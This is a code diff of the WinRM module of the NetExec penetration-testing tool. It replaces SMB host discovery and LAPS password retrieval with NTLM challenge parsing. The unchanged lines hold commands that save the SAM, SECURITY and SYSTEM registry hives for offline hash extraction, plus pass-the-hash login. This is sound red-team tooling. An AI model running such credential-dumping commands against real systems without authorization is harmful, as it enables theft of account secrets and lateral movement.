@@ -1,9 +1,7 @@
-import binascii
-import hashlib
 import os
+import base64
 import requests
 import urllib3
-import contextlib
 import logging
 import xml.etree.ElementTree as ET
 
@@ -12,18 +10,18 @@ from datetime import datetime
 from pypsrp.wsman import NAMESPACES
 from pypsrp.client import Client
 
-from impacket.smbconnection import SMBConnection
 from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes
 
 from nxc.config import process_secret
 from nxc.connection import connection
 from nxc.helpers.bloodhound import add_user_bh
 from nxc.helpers.misc import gen_random_string
-from nxc.protocols.ldap.laps import LDAPConnect, LAPSv2Extract
+from nxc.helpers.ntlm_parser import parse_challenge
 from nxc.logger import NXCAdapter
 
 
 urllib3.disable_warnings()
+
 
 class winrm(connection):
     def __init__(self, args, db, host):
@@ -35,167 +33,50 @@ class winrm(connection):
         self.lmhash = ""
         self.nthash = ""
         self.ssl = False
-        self.auth_type = None
+        self.challenge_header = None
 
         connection.__init__(self, args, db, host)
 
     def proto_logger(self):
-        # Reason why default is SMB/445, because default is enumerate over SMB.
-        # For more details, please check the function "print_host_info" 
+        # For more details, please check the function "print_host_info"
         logging.getLogger("pypsrp").disabled = True
         logging.getLogger("pypsrp.wsman").disabled = True
         self.logger = NXCAdapter(
             extra={
-                "protocol": "SMB",
+                "protocol": "WINRM",
                 "host": self.host,
-                "port": "445",
+                "port": "5985",
                 "hostname": self.hostname,
             }
         )
 
     def enum_host_info(self):
-        # smb no open, specify the domain
-        if self.args.no_smb:
-            self.domain = self.args.domain
-        else:
-            try:
-                smb_conn = SMBConnection(self.host, self.host, None, timeout=5)
-                no_ntlm = False
-            except Exception as e:
-                self.logger.fail(f"Error retrieving host domain: {e} specify one manually with the '-d' flag")
-            else:
-                try:
-                    smb_conn.login("", "")
-                except BrokenPipeError:
-                    self.logger.fail("Broken Pipe Error while attempting to login")
-                except Exception as e:
-                    if "STATUS_NOT_SUPPORTED" in str(e):
-                        # no ntlm supported
-                        no_ntlm = True
+        ntlm_info = parse_challenge(base64.b64decode(self.challenge_header.split(" ")[1].replace(",", "")))
+        self.domain = ntlm_info["domain"]
+        self.hostname = ntlm_info["hostname"]
+        self.server_os = ntlm_info["os_version"]
+        self.logger.extra["hostname"] = self.hostname
 
-                self.domain = smb_conn.getServerDNSDomainName() if not no_ntlm else self.args.domain
-                self.hostname = smb_conn.getServerName() if not no_ntlm else self.host
-                self.server_os = smb_conn.getServerOS()
-                if isinstance(self.server_os.lower(), bytes):
-                    self.server_os = self.server_os.decode("utf-8")
+        self.output_filename = os.path.expanduser(f"~/.nxc/logs/{self.hostname}_{self.host}_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}")
 
-                self.logger.extra["hostname"] = self.hostname
-
-                self.output_filename = os.path.expanduser(f"~/.nxc/logs/{self.hostname}_{self.host}_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}")
-
-                with contextlib.suppress(Exception):
-                    smb_conn.logoff()
-
-                self.db.add_host(self.host, self.port, self.hostname, self.domain, self.server_os)
+        self.db.add_host(self.host, self.port, self.hostname, self.domain, self.server_os)
 
         if self.args.domain:
             self.domain = self.args.domain
 
         if self.args.local_auth:
             self.domain = self.hostname
-        
+
         if self.domain is None:
             self.domain = ""
-        
+
         self.output_filename = os.path.expanduser(f"~/.nxc/logs/{self.hostname}_{self.host}_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}".replace(":", "-"))
 
-    def laps_search(self, username, password, ntlm_hash, domain):
-        ldapco = LDAPConnect(self.domain, "389", self.domain)
-
-        if self.kerberos:
-            if self.kdcHost is None:
-                self.logger.fail("Add --kdcHost parameter to use laps with kerberos")
-                return False
-
-            connection = ldapco.kerberos_login(
-                domain,
-                username[0] if username else "",
-                password[0] if password else "",
-                ntlm_hash[0] if ntlm_hash else "",
-                kdcHost=self.kdcHost,
-                aesKey=self.aesKey,
-            )
-        else:
-            connection = ldapco.auth_login(
-                domain,
-                username[0] if username else "",
-                password[0] if password else "",
-                ntlm_hash[0] if ntlm_hash else "",
-            )
-        if not connection:
-            self.logger.fail(f"LDAP connection failed with account {username[0]}")
-            return False
-
-        search_filter = "(&(objectCategory=computer)(|(msLAPS-EncryptedPassword=*)(ms-MCS-AdmPwd=*)(msLAPS-Password=*))(name=" + self.hostname + "))"
-        attributes = [
-            "msLAPS-EncryptedPassword",
-            "msLAPS-Password",
-            "ms-MCS-AdmPwd",
-            "sAMAccountName",
-        ]
-        results = connection.search(searchFilter=search_filter, attributes=attributes, sizeLimit=0)
-
-        msMCSAdmPwd = ""
-        sAMAccountName = ""
-        username_laps = ""
-
-        from impacket.ldap import ldapasn1 as ldapasn1_impacket
-
-        results = [r for r in results if isinstance(r, ldapasn1_impacket.SearchResultEntry)]
-        if len(results) != 0:
-            for host in results:
-                values = {str(attr["type"]).lower(): attr["vals"][0] for attr in host["attributes"]}
-                if "mslaps-encryptedpassword" in values:
-                    from json import loads
-
-                    msMCSAdmPwd = values["mslaps-encryptedpassword"]
-                    d = LAPSv2Extract(bytes(msMCSAdmPwd), username[0] if username else "", password[0] if password else "", domain, ntlm_hash[0] if ntlm_hash else "", self.args.kerberos, self.args.kdcHost, 339)
-                    data = d.run()
-                    r = loads(data)
-                    msMCSAdmPwd = r["p"]
-                    username_laps = r["n"]
-                elif "mslaps-password" in values:
-                    from json import loads
-
-                    r = loads(str(values["mslaps-password"]))
-                    msMCSAdmPwd = r["p"]
-                    username_laps = r["n"]
-                elif "ms-mcs-admpwd" in values:
-                    msMCSAdmPwd = str(values["ms-mcs-admpwd"])
-                else:
-                    self.logger.fail("No result found with attribute ms-MCS-AdmPwd or msLAPS-Password")
-            self.logger.debug(f"Host: {sAMAccountName:<20} Password: {msMCSAdmPwd} {self.hostname}")
-        else:
-            self.logger.fail(f"msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS property for {self.hostname}")
-            return False
-
-        self.username = username_laps if username_laps else self.args.laps
-        self.password = msMCSAdmPwd
-
-        if msMCSAdmPwd == "":
-            self.logger.fail(f"msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS property for {self.hostname}")
-            return False
-        if ntlm_hash:
-            hash_ntlm = hashlib.new("md4", msMCSAdmPwd.encode("utf-16le")).digest()
-            self.hash = binascii.hexlify(hash_ntlm).decode()
-
-        self.domain = self.hostname
-        return True
-
     def print_host_info(self):
-        if self.args.no_smb:
-            self.logger.extra["protocol"] = "WINRM-SSL" if self.ssl else "WINRM"
-            self.logger.extra["port"] = self.port
-            self.logger.display(f"{self.server_os} (name:{self.hostname}) (domain:{self.domain})")
-        else:
-            self.logger.display(f"{self.server_os} (name:{self.hostname}) (domain:{self.domain})")
-            self.logger.extra["protocol"] = "WINRM-SSL" if self.ssl else "WINRM"
-            self.logger.extra["port"] = self.port
-        
-        self.logger.info(f"Connection information: {self.endpoint} (auth type:{self.auth_type}) (domain:{self.domain if self.args.domain else ''})")
+        self.logger.extra["protocol"] = "WINRM-SSL" if self.ssl else "WINRM"
+        self.logger.extra["port"] = self.port
+        self.logger.display(f"{self.server_os} (name:{self.hostname}) (domain:{self.domain})")
 
-        if self.args.laps:
-            return self.laps_search(self.args.username, self.args.password, self.args.hash, self.domain)
         return True
 
     def create_conn_obj(self):
@@ -204,6 +85,14 @@ class winrm(connection):
             return False
 
         endpoints = {}
+
+        headers = {
+            "Content-Length": "0",
+            "Keep-Alive": "true",
+            "Content-Type": "application/soap+xml;charset=UTF-8",
+            "User-Agent": "Microsoft WinRM Client",
+            "Authorization": "Negotiate TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="
+        }
 
         for protocol in self.args.check_proto:
             endpoints[protocol] = {}
@@ -219,9 +108,12 @@ class winrm(connection):
             self.port = endpoints[protocol]["port"]
             try:
                 self.logger.debug(f"Requesting URL: {endpoints[protocol]['url']}")
-                res = requests.post(endpoints[protocol]["url"], verify=False, timeout=self.args.http_timeout) 
+                res = requests.post(endpoints[protocol]["url"], headers=headers, verify=False, timeout=self.args.http_timeout)
                 self.logger.debug(f"Received response code: {res.status_code}")
-                self.auth_type = res.headers["WWW-Authenticate"] if "WWW-Authenticate" in res.headers else "NOAUTH"
+                self.challenge_header = res.headers["WWW-Authenticate"]
+                if (not self.challenge_header) or ("Negotiate" not in self.challenge_header):
+                    self.logger.info('Failed to get NTLM challenge from target "/wsman" endpoint, maybe isn\'t winrm service.')
+                    return False
                 self.endpoint = endpoints[protocol]["url"]
                 self.ssl = endpoints[protocol]["ssl"]
                 return True
@@ -233,7 +125,7 @@ class winrm(connection):
                 else:
                     self.logger.info(f"Other ConnectionError to WinRM service: {e}")
         return False
-    
+
     def check_if_admin(self):
         wsman = self.conn.wsman
         wsen = NAMESPACES["wsen"]
@@ -246,12 +138,11 @@ class winrm(connection):
         wsman.enumerate("http://schemas.microsoft.com/wbem/wsman/1/windows/shell", enum_msg)
         self.admin_privs = True
         return True
-        
+
     def plaintext_login(self, domain, username, password):
         self.admin_privs = False
-        if not self.args.laps:
-            self.password = password
-            self.username = username
+        self.password = password
+        self.username = username
         self.domain = domain
         try:
             self.conn = Client(
@@ -290,15 +181,13 @@ class winrm(connection):
         self.admin_privs = False
         lmhash = "00000000000000000000000000000000"
         nthash = ""
-        if not self.args.laps:
-            self.username = username
-            # This checks to see if we didn't provide the LM Hash
-            if ntlm_hash.find(":") != -1:
-                lmhash, nthash = ntlm_hash.split(":")
-            else:
-                nthash = ntlm_hash
+        self.username = username
+        # This checks to see if we didn't provide the LM Hash
+        if ntlm_hash.find(":") != -1:
+            lmhash, nthash = ntlm_hash.split(":")
         else:
-            nthash = self.hash
+            nthash = ntlm_hash
+
         self.lmhash = lmhash
         self.nthash = nthash
         self.domain = domain
@@ -345,7 +234,7 @@ class winrm(connection):
             # Reference: https://github.com/diyan/pywinrm/issues/275
             if hasattr(e, "code") and e.code == 5:
                 self.logger.fail(f"Execute command failed, current user: '{self.domain}\\{self.username}' has no 'Invoke' rights to execute command (shell type: {shell_type})")
-                
+
                 if shell_type == "cmd":
                     self.logger.info("Cannot execute command via cmd, the user probably does not have invoke rights with Root WinRM listener - now switching to Powershell to attempt execution")
                     self.execute(payload, get_output, shell_type="powershell")
@@ -371,7 +260,7 @@ class winrm(connection):
     def sam(self):
         sam_storename = gen_random_string(6)
         system_storename = gen_random_string(6)
-        dump_command = f"reg save HKLM\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\SYSTEM C:\\windows\\temp\\{system_storename}"
+        dump_command = f"reg save HKLM\\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
         clean_command = f"del C:\\windows\\temp\\{sam_storename} && del C:\\windows\\temp\\{system_storename}"
         try:
             self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
@@ -400,7 +289,7 @@ class winrm(connection):
     def lsa(self):
         security_storename = gen_random_string(6)
         system_storename = gen_random_string(6)
-        dump_command = f"reg save HKLM\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\SYSTEM C:\\windows\\temp\\{system_storename}"
+        dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
         clean_command = f"del C:\\windows\\temp\\{security_storename} && del C:\\windows\\temp\\{system_storename}"
         try:
             self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
